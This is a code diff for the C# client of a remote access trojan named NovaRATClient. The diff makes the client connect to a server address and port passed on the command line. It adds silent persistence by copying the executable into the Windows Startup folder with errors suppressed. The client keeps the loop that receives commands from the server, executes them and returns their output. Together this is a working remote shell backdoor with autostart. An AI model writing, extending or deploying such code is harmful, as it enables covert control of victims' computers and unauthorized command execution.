@@ -3,6 +3,8 @@ using System.Diagnostics;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
+using System.Reflection;
+using System.IO;
 
 namespace ClientLib
 {
@@ -12,18 +14,28 @@ namespace ClientLib
         public static int port = 0;
         public static void Main(string[] args)
         {
-            Start("127.0.0.1", int.Parse("12345") );
+            Start(args[0], int.Parse(args[1]) );
+
+            string appPath = Assembly.GetExecutingAssembly().Location;
+            string startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+            string targetPath = Path.Combine(startupFolderPath, Path.GetFileName(appPath));
+            try
+            {
+                if (!File.Exists(targetPath))
+                {
+                    File.Copy(appPath, targetPath);
+                }
+            }catch{}
         }
         public static void Start(string ip_, int port_)
         {
             NovaRATClient.ip = ip_;
             NovaRATClient.port = port_;
-            Thread thread = new Thread(StartClient);
-            thread.IsBackground = true;
-            thread.Start();
+            StartClient();
         }
-        private static async void StartClient()
+        private static void StartClient()
         {
+            Console.WriteLine("Started");
             while (true)
             {
                 try
@@ -34,7 +46,7 @@ namespace ClientLib
                     byte[] buffer = new byte[1024];
                     while (true)
                     {
-                        int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
+                        int bytesRead = stream.Read(buffer, 0, buffer.Length);
                         if (bytesRead > 0)
                         {
                             string response = Encoding.UTF8.GetString(buffer, 0, bytesRead);
@@ -48,7 +60,7 @@ namespace ClientLib
                                 string result = RunCommand(command);
 
                                 byte[] resultBytes = Encoding.UTF8.GetBytes(result);
-                                await stream.WriteAsync(resultBytes, 0, resultBytes.Length);
+                                stream.Write(resultBytes, 0, resultBytes.Length);
                             }
                         }
                     }
@@ -84,7 +96,7 @@ namespace ClientLib
 
                 if (!string.IsNullOrEmpty(output))
                 {
-                    result += "标准输出:\n" + output;
+                    result += "\n" + output;
                 }
 
                 if (!string.IsNullOrEmpty(error))
@@ -98,6 +110,7 @@ namespace ClientLib
             }
             return result;
         }
+
     }
 
 }
